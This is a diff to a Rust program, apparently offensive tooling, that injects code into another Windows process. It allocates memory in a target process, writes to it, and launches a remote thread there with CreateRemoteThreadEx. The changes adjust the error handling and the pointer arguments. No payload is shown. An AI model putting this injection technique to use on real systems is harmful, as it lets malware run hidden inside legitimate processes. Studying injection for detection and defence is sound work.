@@ -1,4 +1,4 @@
-use std::ptr;
+use std::ptr::{self, null, null_mut};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use windows::Win32::Foundation::CloseHandle;
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
@@ -63,7 +63,7 @@ fn main() {
                         if haddr.is_null() {
                             eprintln!("[!] Failed to Allocate Memory in Target Process.");
                             CloseHandle(hprocess);
-                            continue;
+                            std::process::exit(-1)
                         }
 
                         println!("[i] Writing to memory");
@@ -93,16 +93,15 @@ fn main() {
                         });
 
                         println!("[+] Creating a Remote Thread");
-                        let tid: u32 = 0;
                         let hthread = CreateRemoteThreadEx(
                             hprocess,
-                            None,
+                            Some(null()),
                             0,
                             Some(std::mem::transmute(haddr)),
-                            None,
+                            Some(null()),
                             0,
                             None,
-                            Some(tid as _),
+                            Some(null_mut()),
                         ).unwrap_or_else(|e| {
                             eprintln!("[!] CreateRemoteThreadEx Failed With Error: {}", e);
                             CloseHandle(hprocess);
